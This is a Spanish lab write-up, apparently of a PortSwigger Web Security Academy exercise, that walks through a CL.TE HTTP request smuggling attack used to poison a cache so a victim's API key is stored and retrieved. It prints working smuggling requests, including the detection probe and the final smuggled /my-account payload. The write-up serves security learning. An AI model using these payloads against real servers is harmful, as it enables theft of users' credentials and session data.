### Lab Description

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.

To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Metogología
Primero procedemos a testear si es posibile utilizar nuestras dos cabeceras preferidas:
~~~
POST / HTTP/1.1
Host: Portsqiger-lab
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
~~~
El time out significa que es CL.TE, el front-end está priorizando el content-length y el backend da un time out porque nunca recibe un 0 que indique que la solicitud terminó.
La primera request dió 200, la segunda me dió 404, con esto confirmamos que es vulnerable al pipeling
~~~
POST / HTTP/1.1
Host: 0afa00f403658df58014c11e00550063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Transfer-Encoding: chunked

0

GET /qwert HTTP/1.1
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
~~~

### Analizando el flujo de la web
El objetivo es capturar una api, así que busco en los endpoints del HTTP history de burpsuite para encontrar una ruta vulnerable, ya que es muy importante probar en cada endpoint. en el propio posteo de comentarios, una de las cabeceras es el cookie session, pero si la concatenamos a nuestra petición maliciosa tendremos un error, es que esta cabecera está hecha para que el post reciba un ID, so give up, you don't have fucking chance. Por otro lado, la solicitud que se hace al recargar la página tambien tiene un cookie session, pero está no está visible en la espuesta del servidor. Tenemos una nueva página que es la de inicio de sesión, nos conectamos con las credenciales que nos decían en la descripción, wiener y contraseña, peter. La solicitud es esta:
```
GET /my-account?id=wiener HTTP/1.1
Host: 0afd00b803c4e49c806dc60300bf003d.web-security-academy.net
Cookie: session=cg2VMMwCnksIhnkmgT18a8P12a3VsiPt
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0afd00b803c4e49c806dc60300bf003d.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i
```

En la response nos muestra la clave de la API, lo cual la hace el objetivo perfecto, sin embargo en la ruta tenemos un id que complica las cosas "id=wiener" pero sacandolo la respuesta es válida.
Ahora solo nos hace falta una Esta solicitud por el contratio:
```REQUEST
GET /resources/js/tracking.js HTTP/2
Host: 0afd00b803c4e49c806dc60300bf003d.web-security-academy.net
Cookie: session=WxZgrPoWK4rPa4iuJeJoOrJUdQUPo6xz
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0afd00b803c4e49c806dc60300bf003d.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1
```
Esto es un static assets, el cual esta presente en casi todas las solicitudes de la página, para recargar la api
Nosotros queremos capturar ese Static assetss porque es cacheable. Entonces tenemos que renviar la pestaña de ataque varias veces
```
POST / HTTP/1.1
Host: 0afd00b803c4e49c806dc60300bf003d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: x
```
Porque X-Ingore y no un x: , en el body, bueno, el motivo es porque nosotros queremos capturar la ruta "/my-account" de la víctima, por eso enviamos la pestaña de ataque muchas veces, entre todas las request una será la indicada
Entonces ahora si le doy a resend al tracking
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0afd00b803c4e49c806dc60300bf003d.web-security-academy.net
Cookie: session=WxZgrPoWK4rPa4iuJeJoOrJUdQUPo6xz
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Li nux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0afd00b803c4e49c806dc60300bf003d.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1
```
En realidad se carga la solicitud anterior, la indicada que queremos que se cargue:
```
POST / HTTP/1.1
Host: 0afd00b803c4e49c806dc60300bf003d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: xGET /resources/js/tracking.js HTTP/1.1
Host: 0afd00b803c4e49c806dc60300bf003d.web-security-academy.net
...
```
La cual tiene la cookie de la víctima que se recarga en la página de my-account, por lo que nos responderá con la página my-account
